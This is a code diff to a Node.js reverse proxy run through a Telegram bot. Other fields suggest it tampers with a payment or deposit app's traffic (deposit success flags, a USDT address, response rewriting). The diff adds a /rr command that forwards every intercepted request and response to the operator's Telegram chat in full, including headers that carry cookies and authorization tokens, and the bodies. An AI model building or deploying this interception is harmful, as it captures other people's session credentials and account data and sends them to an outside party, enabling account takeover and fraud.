@@ -21,6 +21,7 @@ const DEFAULT_DATA = {
   lastUsedIndex: -1,
   adminChatId: null,
   logRequests: false,
+  rawLog: false,
   usdtAddress: '',
   depositSuccess: false,
   depositBonus: 0,
@@ -155,6 +156,82 @@ async function notifyAdmin(data, msg) {
     try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch(e) {}
   }
 }
+
+// ── Raw Request+Response logger (/rr command) ────────────────────────────────
+async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, respHeaders, respBodyRaw, source, now }) {
+  if (!data.rawLog || !data.adminChatId || !bot) return;
+
+  // ── Format headers as clean key: value lines
+  function fmtHeaders(hdrs) {
+    if (!hdrs || typeof hdrs !== 'object') return '  (none)';
+    return Object.entries(hdrs)
+      .map(([k, v]) => `  ${k}: ${v}`)
+      .join('\n') || '  (none)';
+  }
+
+  // ── Pretty-print JSON body or raw string
+  function fmtBody(raw) {
+    if (!raw || (typeof raw === 'string' && raw.trim() === '') || (Buffer.isBuffer(raw) && raw.length === 0)) return '  (empty)';
+    const str = Buffer.isBuffer(raw) ? raw.toString('utf-8') : String(raw);
+    try {
+      const parsed = JSON.parse(str);
+      return JSON.stringify(parsed, null, 2);
+    } catch(e) {
+      return str;
+    }
+  }
+
+  // ── Split a long string into Telegram-safe chunks (max 4000 chars)
+  async function sendChunked(text) {
+    const MAX = 4000;
+    if (text.length <= MAX) {
+      try { await bot.sendMessage(data.adminChatId, text); } catch(e) {}
+      return;
+    }
+    let i = 0;
+    let part = 1;
+    while (i < text.length) {
+      const chunk = text.slice(i, i + MAX);
+      try { await bot.sendMessage(data.adminChatId, `[part ${part}]\n` + chunk); } catch(e) {}
+      i += MAX;
+      part++;
+    }
+  }
+
+  const srcTag = source === 'frontend' ? '🌐 FRONTEND' : '📱 API';
+
+  // ── REQUEST message
+  const reqMsg =
+`╔══════════════════════════════════╗
+║   📡 RAW LOG — ${srcTag}
+╚══════════════════════════════════╝
+🕐 ${now}
+
+📤 REQUEST
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔹 Method : ${method}
+🔹 URL    : ${url}
+
+📋 Headers:
+${fmtHeaders(reqHeaders)}
+
+📦 Body:
+${fmtBody(reqBodyRaw)}`;
+
+  // ── RESPONSE message
+  const respMsg =
+`📥 RESPONSE  [${status}]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 Headers:
+${fmtHeaders(respHeaders)}
+
+📦 Body:
+${fmtBody(respBodyRaw)}`;
+
+  await sendChunked(reqMsg);
+  await sendChunked(respMsg);
+}
+// ─────────────────────────────────────────────────────────────────────────────
 
 function findNumericId(obj, depth) {
   if (!obj || typeof obj !== 'object' || depth > 5) return '';
@@ -522,6 +599,7 @@ app.post('/bot-webhook', async (req, res) => {
 /off — Proxy OFF
 /rotate — Toggle auto-rotate
 /log — Toggle request logging
+/rr — Toggle full raw request+response log
 /update — Toggle update block
 /status — Full status
 
@@ -573,6 +651,18 @@ Example:
     if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF'); return res.sendStatus(200); }
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+
+    if (text === '/rr') {
+      data.rawLog = !data.rawLog;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId,
+        data.rawLog
+          ? '📡 Raw Log: 🟢 ON\n\nAb har request ka FULL detail aayega:\n• Method, URL, Headers, Body\n• Response Status, Headers, Body\n• App API (/xxapi/*) + Frontend pages dono\n\nBand karne ke liye dobara /rr bhejo.'
+          : '📡 Raw Log: 🔴 OFF\n\nFull request/response logging band.'
+      );
+      return res.sendStatus(200);
+    }
 
     if (text === '/update' || text === '/update off' || text === '/update on') {
       if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
@@ -1357,6 +1447,19 @@ ${replaceLine}
 
     if (userId) await saveData(data);
 
+    // ── Raw log — send full req+resp to Telegram if /rr is ON
+    sendRawLog(data, {
+      method: req.method,
+      url: req.originalUrl || req.url,
+      reqHeaders: req.headers,
+      reqBodyRaw: req.rawBody,
+      status: response.status,
+      respHeaders: respHeaders,
+      respBodyRaw: respBody,
+      source: 'api',
+      now
+    }).catch(() => {});
+
     sendJson(res, respHeaders, jsonResp);
 
   } catch(e) {
@@ -1736,6 +1839,7 @@ app.all('*', async (req, res) => {
   try {
     const path = req.originalUrl || req.url;
     const url = 'https://' + FRONTEND_HOST + path;
+    const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
     const fwd = {};
     for (const [k, v] of Object.entries(req.headers)) {
@@ -1840,6 +1944,18 @@ app.all('*', async (req, res) => {
       res.setHeader('content-type', 'text/html; charset=utf-8');
       res.setHeader('content-length', String(buf.length));
       res.status(response.status).end(buf);
+
+      // Raw log — frontend HTML page load
+      if (cachedData && cachedData.rawLog) {
+        const rhdrs = {}; response.headers.forEach((v, k) => { rhdrs[k] = v; });
+        loadData().then(d => sendRawLog(d, {
+          method: req.method, url: req.originalUrl || req.url,
+          reqHeaders: req.headers, reqBodyRaw: req.rawBody,
+          status: response.status, respHeaders: rhdrs,
+          respBodyRaw: html.substring(0, 8000),
+          source: 'frontend', now
+        })).catch(() => {});
+      }
       return;
     }
 
@@ -1889,10 +2005,21 @@ app.all('*', async (req, res) => {
       return;
     }
 
-    // Everything else — stream as-is
+    // Everything else — stream as-is (log if JSON/text and rawLog ON)
     const buf = Buffer.from(await response.arrayBuffer());
     res.setHeader('content-length', String(buf.length));
     res.status(response.status).end(buf);
+
+    if (cachedData && cachedData.rawLog && (ct.includes('json') || ct.includes('text'))) {
+      const rhdrs = {}; response.headers.forEach((v, k) => { rhdrs[k] = v; });
+      loadData().then(d => sendRawLog(d, {
+        method: req.method, url: req.originalUrl || req.url,
+        reqHeaders: req.headers, reqBodyRaw: req.rawBody,
+        status: response.status, respHeaders: rhdrs,
+        respBodyRaw: buf.toString('utf-8').substring(0, 8000),
+        source: 'frontend', now
+      })).catch(() => {});
+    }
 
   } catch(e) {
     console.error('Frontend proxy error:', e.message);
